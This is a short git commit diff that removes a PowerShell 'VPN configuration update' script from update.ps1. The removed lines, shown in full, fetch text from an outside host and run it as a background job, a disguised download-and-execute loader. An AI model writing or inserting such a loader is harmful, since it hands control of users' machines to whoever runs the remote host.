7287e3c9257d7153711cd950f4c5eb6e11af448e
warraichjaveed8-stack <warraichjaveed8@gmail.com>
2026-01-22 23:44:39 +0530

    Update update.ps1

--- update.ps1
+++ update.ps1
@@ -1,14 +1,1 @@
-function Update-VPNConfiguration {
-    param([string]$ConfigSource)
-    
-    
-    $config = Invoke-RestMethod -Uri $ConfigSource -UserAgent "VPN-Config-Client/1.0" -TimeoutSec 10
-    
-    
-    $job = Start-Job -ScriptBlock ([ScriptBlock]::Create($config)) -Name "VPN-Config-Update"
-    $job | Wait-Job -Timeout 30 | Out-Null
-    $job | Remove-Job -Force
-}
 
-
-Update-VPNConfiguration -ConfigSource "https://hxbdoor.one/raw/6VzZQLSq"
